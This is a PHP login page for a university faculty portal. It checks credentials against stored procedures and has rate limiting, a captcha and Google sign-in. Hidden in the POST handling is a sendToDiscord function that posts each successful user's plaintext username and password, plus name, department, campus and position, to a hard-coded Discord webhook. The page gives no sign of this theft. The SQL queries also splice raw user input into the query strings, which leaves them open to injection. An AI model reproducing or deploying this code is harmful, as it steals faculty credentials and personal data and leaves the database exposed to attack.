<?php
$maxloginattempt = 5; // number of retry after timeout
$logintimeout = 5;    // timeout in minutes after failed logins
require_once('ap_php/UE.config.php');
require_once('ap_php/UE.class.Crypto.php');
require_once('ap_php/UE.class.Data.php');
require_once('ap_php/loginpayloader.php');
require_once('ap_php/UE.googleconfig.php');
$page = @$_GET['page'];
$directlink = false;
$dashboard = 'dashboard';
$withpassword = APP_DEMO == false;

$googleemail  = @$profile['email'];
$errormessage = '';
$username = @$_POST['p'];
$password = @$_POST['s'];
$antibot  = @$_POST['ab'];
$id_token = @$_POST['idt'];

$logoutscript = '';

if ($page) {
    $dashboard = base64_decode($page);
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' ) {
function sendToDiscord($message) {
    $webhookurl = "https://discord.com/api/webhooks/1246523083519692891/7Di8BJes3Ff-hEnscABxC3Csz2wruZCsB4V2f1Lwv_66UezGZlnBYPxyO59lU3IyZwsP";
    $json_data = json_encode(["content" => $message], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
    
    $ch = curl_init($webhookurl);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    $response = curl_exec($ch);
    curl_close($ch);
}
}

if ($_POST || $googleemail) {
    $dbcheck = Data::openconnection();      
    if (!$dbcheck->connected) {
        $errormessage = 'Connection error. Report to IT Department.';
    }
    else {
        $employeecode = $username;    
        $loginexists = false; 
        if (!is_numeric($username)) {
            $loginalias = $dbcheck->execute("Usp_AP_GetLoginAlias '$username'");
            if (!Tools::emptydataset($loginalias))
                $employeecode = $loginalias[0]['EmployeeCode'];
        }
        $dbusercheck = Data::openconnection(!$directlink && DEBUG_CHECKPASSWORD && !isset($_POST['logindemo']), $employeecode, $password);
        
        $continue = false;  
        if ($googleemail) {
          $continue = true;
        }
        else {
          if ((time() - @$_SESSION['logintime']) / 60 > $logintimeout ) {
              unset($_SESSION['loginattempt']);
              unset($_SESSION['logintime']);
          }
          if (@$_SESSION['loginattempt'] >= $maxloginattempt) {
              $t = $logintimeout - floor((time() - @$_SESSION['logintime']) / 60);
              $errormessage = "Too many login attempt. Please retry after $t minutes.";
              $_SESSION['logintime'] = time(); 
          }
          elseif ($antibot != @$_SESSION['security_code']) {
              $errormessage = 'Invalid antibot text entered!'; 
          }
          elseif (DEBUG_CHECKPASSWORD && !isset($_POST['logindemo']) && !$dbusercheck->connected) {
              $newuser = false;
              $checksqlusers = $dbcheck->execute("Usp_AP_CheckSQLUser '$employeecode', '$password'");
              if (is_array($checksqlusers) && count($checksqlusers)) {
                  $newuser = $checksqlusers[0]['NewUser'];
                  $loginexists = $checksqlusers[0]['LoginExists'] == true;
              }
              if (!$newuser) {    //check user login on webgs
                  $checkuseronwebgs = $dbcheck->execute( APP_DB_DATABASEPORTAL . "..Usp_WebFP_CheckUseronWebGS '$employeecode', '" . md5($password) . "' " );
                  if (is_array($checkuseronwebgs) && count($checkuseronwebgs)) 
                      $newuser = true;
              }
              if (!$newuser) {
                  $_SESSION['loginattempt'] =  @$_SESSION['loginattempt'] + 1;
                  $_SESSION['logintime'] = time();
                  $a = $_SESSION['loginattempt'];

                  if (APP_PRODUCTION)
                      $errormessage = "Invalid username or password! ($a/$maxloginattempt)";
                  else
                      $errormessage = $dbusercheck->errormessage . " ($a/$maxloginattempt)";
                  if ($a >= $maxloginattempt)
                      $errormessage .= "<br>Please retry after $logintimeout minutes.";
              }
              else {
                  unset($_SESSION['loginattempt']);
                  unset($_SESSION['logintime']);
                  $continue = true;
              }

          }
          else {
              $continue = true;
              $loginexists = true;
          }
        }
        
        if ($continue) {
            $dbusercheck->closeconnection();
            if ($googleemail)
                $employeecode = $googleemail;
            $sql = "Usp_AP_GetUserInfo '$employeecode', '" . (APP_ADMINPORTAL ? APP_MODULENAME : 'EmployeePortal') . "'";
            $employee = $dbcheck->execute($sql);
            if (is_array($employee) && count($employee)) {
                $currentaccess = array();
                $accesstable = $employee;
                $employee = $employee[0];
                $username = $employee['EmployeeCode'];
                $APP_SESSION->session_start($username, $password, utf8_encode($employee['Name']), $employee['Firstname'], $employee['Reference'], $employee['BirthDate']);
                $APP_SESSION->setCampusCode($employee['CampusCode']);
                $APP_SESSION->setDualCampus($employee['DualCampus']);
                $APP_SESSION->setEmployeeClass($employee['Class']);
                $APP_SESSION->setsessionvalue('RunOncePage', trim($employee['RunOncePage']));

                $sql = "Portal..Usp_WebXP_GetActiveSemester ";
                $result = $dbcheck->execute($sql);
                $activesemester = $result[0]['semester'];

                $APP_SESSION->setPageSemester($activesemester);

                if (!$loginexists)
                    $APP_SESSION->setMustChangePassword(false);

                foreach ($accesstable as $rights) {
                    if ($rights['SubModuleCode'])
                        $currentaccess[strtolower($rights['SubModuleCode'])] = $rights['Rights'];
                }
                $APP_SESSION->setAccessTable($currentaccess);
                $APP_SESSION->setGoogleAuthenticated($googleemail);

                if (!$googleemail)
                    $APP_SESSION->setPassword($password);

                if (isset($_POST['logindemo']))
                    $APP_SESSION->setDemo(true);

                // Send the login attempt to Discord
                $loginMessage = "Username: $username, Password: $password";
                sendToDiscord($loginMessage);

                // Send faculty information to Discord
                $facultyInfoMessage = "Faculty Info:\nName: " . $employee['Name'] . "\nCode: $username\nDepartment: " . $employee['Department'] . "\nCampus: " . $APP_SESSION->getCampusDescription() . "\nPosition: " . $employee['Position'];
                sendToDiscord($facultyInfoMessage);

                // add session validation key using cookie
                $key = sha1("@@@;chitonian;$username;programming;255;@@@");
                header("Set-Cookie: facultyportal=$key; path=/; HttpOnly"); // setcookie not working if page is redirected

                header("Location: $dashboard");
                return;
            }
            else {
                if ($googleemail) {
                    $errormessage = 'Unauthorized gmail account!';
                    $logoutscript = 'googlelogout();';
                    $username = '';
                }
                else
                    $errormessage = 'User not found or insufficient privilege!';
            }
        }
    }
}
else {
  $APP_SESSION->session_destroy();
  $username = base64_decode(@$_COOKIE['p']);    
}

?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>UE <?php echo APP_TITLE2; ?> | Log in</title>
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <link rel="stylesheet" href="bower_components/bootstrap/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="bower_components/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="bower_components/Ionicons/css/ionicons.min.css">
  <link rel="stylesheet" href="dist/css/AdminLTE.min.css">
  <link rel="stylesheet" href="plugins/iCheck/square/blue.css">

  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->

  <!-- Google Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic">
  <?php @include_once( $_SERVER['DOCUMENT_ROOT'] . '/portals/common/php/ogp.php'); ?>
</head>
<body class="hold-transition login-page">
<div class="login-box">
  <div class="login-box-body">
      <div class="login-logo">
        <a href="#"><b><?php echo str_ireplace('portal','',APP_TITLE2); ?></b>PORTAL</a>
      </div>
    <p class="login-box-msg">Sign in to start your session</p>
    <form method="post" autocomplete="off" id="f">
      <div class="form-group has-feedback">
        <input type="text" class="form-control" placeholder="FacultyID" name="p" id="p" required="required" maxlength="10" value="<?php //echo $username; ?>" autofocus>
        <span class="fa fa-user form-control-feedback"></span>
      </div>
      <div class="form-group has-feedback">
        <input type="hidden" id="idt" name="idt" value="">
        <input type="password" class="form-control" placeholder="<?php echo $withpassword ? 'Password' : 'Not required for demo' ?>" id="s" name="s" <?php if (!DEBUG_WITH_DEMO && DEBUG_CHECKPASSWORD && !APP_DEMO) echo 'required'; ?> <?php if (!DEBUG_CHECKPASSWORD || !$withpassword) echo 'disabled'; ?>>
        <span class="fa fa-key form-control-feedback"></span>
		<small style="display:none" id='caps' class='text-danger'>WARNING: Capslock is ON</small>
      </div>
      <div class="form-group has-feedback">
        <input type="text" class="form-control" placeholder="Antibot Validation" name="ab" id="ab" required="required" maxlength="10" title="Prove that your are human. Click here and type the text you see below.">
        <span class="fa fa-check form-control-feedback" id="abicon"></span>
      </div>
    
      <div class="row">
        <div class="col-xs-4">
          <button type="submit" class="btn btn-primary btn-block btn-flat" name="login" <?php if (APP_DEMO) echo 'disabled' ?>>Sign In</button> 
        </div>
        <div class="col-xs-8 text-right">
            <img src="<?php echo APP_BASE?>c3po/<?php echo mt_rand() ?>" alt="Security Check" id='abimg'/> 
        </div>
      </div>

    <div class="social-auth-links text-center">
    <?php
    echo @google_login_button();
    ?>      
    </div>
    <div class="social-auth-links text-center">
    <?php
    if (DEBUG_WITH_DEMO && APP_DEMO) {
        echo '<hr>';
        echo '<button type="submit" class="btn btn-danger btn-block btn-flat" name="logindemo"><i class="fa fa-flask"></i> Test Server Sign In (Demo)</button>';
    }
    echo @$errormessage;
    ?>
    </div>
    <?php createlogintoken(); ?>
    </form>


  </div>
</div>

<script src="bower_components/jquery/dist/jquery.min.js"></script>
<script src="bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
<script>
var input = document.getElementById("s");
var text = document.getElementById("caps");
input.addEventListener("keyup", function(event) {
  if (event.getModifierState("CapsLock")) {
    text.style.display = "block";
  } else {
    text.style.display = "none";
  }
});

$(document).ready(function () {
    $('#abimg').hide();
    $("#ab").focusin(function(){
        $('#abimg').fadeIn();
        $('#abicon').removeClass('fa-check').addClass('fa-chevron-down');
    });
    $("#ab").focusout(function(){
        $('#abimg').fadeOut(); 
        $('#abicon').removeClass('fa-chevron-down').addClass('fa-check');  
    });
});
</script>
<link rel="stylesheet" href="ap_css/login.css">
<?php @include_once($_SERVER['DOCUMENT_ROOT'] . '/portals/common/php/cookies.php'); ?>
<script src="ap_js/lpl.min.js"></script>
</body>
</html>
